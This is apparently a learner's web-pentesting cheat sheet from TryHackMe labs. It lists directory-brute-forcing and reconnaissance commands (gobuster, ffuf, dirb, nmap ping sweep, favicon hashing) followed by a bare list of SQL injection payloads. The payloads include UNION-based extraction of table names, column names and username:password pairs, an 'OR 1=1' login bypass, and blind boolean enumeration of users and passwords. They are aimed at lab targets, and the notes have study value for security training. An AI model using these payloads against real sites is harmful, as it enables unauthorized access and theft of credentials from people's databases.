gobuster -u http://fakebank.com -w wordlist.txt dir


# Favicon md5 hash

curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum

match favicon from database to find out default web framework https://wiki.owasp.org/index.php/OWASP_favicon_database

### Web App
- check robot.txt
- check sitemap.xml

### Find Server details using header (curl verbose)

curl http://10.10.26.241 -v


### Find what framework, cms website is using 

https://www.wappalyzer.com/

### Automated info gathering

ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.26.241/FUZZ

dirb http://10.10.26.241/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt    (finding directories)

gobuster dir --url http://10.10.26.241/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt

# Nmap

## Ping Swip

nmap -sn 192.168.0.0/24


# Sql injection

0 UNION SELECT 1,2,database()

0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'

0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'

0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users

' OR 1=1;--

admin123' UNION SELECT 1,2,3;-- 

admin123' UNION SELECT 1,2,3 where database() like 's%';--

admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--

admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--

admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';

admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';

admin123' UNION SELECT 1,2,3 from users where username like 'a%

admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%